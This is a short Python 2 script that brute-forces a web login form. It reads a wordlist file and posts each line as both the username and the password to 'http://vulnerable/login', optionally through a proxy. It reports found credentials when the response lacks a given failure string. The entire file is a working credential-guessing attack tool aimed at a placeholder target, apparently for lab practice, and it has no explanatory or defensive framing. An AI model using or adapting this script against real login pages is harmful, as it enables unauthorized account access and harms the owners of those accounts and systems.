from sys import argv
import requests

opt={}
while argv:
	if argv[0][0]=='-':
		opt[argv[0][1:]]=argv[1]
	argv=argv[1:]
		

with open(opt['file']) as f:
	for line in f:
		line=line[:-1]
		payload={'login':line,'password':line}

		if 'p' in opt:
			proxy={
				'http': opt['p']
			}
			r=requests.post('http://vulnerable/login',data=payload,proxies=proxy)
		else:
			r=requests.post('http://vulnerable/login',data=payload)

		if opt['ignore'] not in r.text:
			print "found creds"
			print line
			break
		else:
			print "wrong creds"	